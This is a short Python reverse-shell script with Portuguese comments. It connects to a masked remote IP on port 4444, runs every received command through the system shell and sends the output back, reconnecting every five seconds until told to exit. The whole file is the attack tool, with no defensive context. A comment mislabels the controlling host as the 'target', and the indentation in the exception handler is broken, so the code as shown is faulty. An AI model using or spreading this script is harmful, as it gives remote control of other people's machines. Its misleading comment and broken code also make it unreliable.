import socket #biblioteca primitiva para conexão entre dois dispositivo
import subprocess #importa comandos via python.
import os
import time

def connect():
    while True:
        try:  #enquanto não conectar com o ALVO, o loop continuará a rodar.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("***.**.**.***", 4444)) #IP DO ALVO AO QUAL O "ATAQUE" VAI OCORRER
            s.send(b"conexão estabelecida.\n")
            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    s.close()
                    break

                output = subprocess.check_output(command, shell=True)
                s.send(output)
        except:
    time.sleep(5)
            continue #FIM DO LOOP SEMI-INFINITO


connect()
